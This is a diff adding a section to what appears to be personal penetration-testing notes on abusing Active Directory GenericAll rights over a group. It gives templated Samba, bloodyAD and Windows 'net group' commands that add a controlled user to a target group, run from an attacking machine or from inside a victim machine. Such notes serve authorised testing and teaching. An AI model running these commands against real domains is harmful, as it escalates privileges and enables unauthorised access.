@@ -69,5 +69,29 @@ Check Force Change Password seccion -> https://github.com/ArtesOscuras/Notes/blo
 
 <br>
 
+-------------------------------------------------
+
+# Abusing GenericAll (User over Group)
+
+Technically if an user have GenericAll over a grup can move user inside that group and change group properties.
+
+### Set an user inside that group:
+#### (externally, from attacking machine)
+You can put users inside the that group, including your self.
+
+Samba tools -> `net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'<password>' -S <dc_ip>`
+
+BloodyAD -> `bloodyAD --host '<ip>' -d '<domain>' -u '<controlled_user>' -p '<password>' add groupMember '<target_group>' '<target_user>'`
+
+<br>
+
+#### (internally, inside victim machine)
+
+If you get inside the machine try it manually. If unsuccesfull you can also try with powerview.
+
+`net group '<target_group>' <target_user> /add /domain`
+
+Source: https://www.hackingarticles.in/genericall-active-directory-abuse/
+
 
 
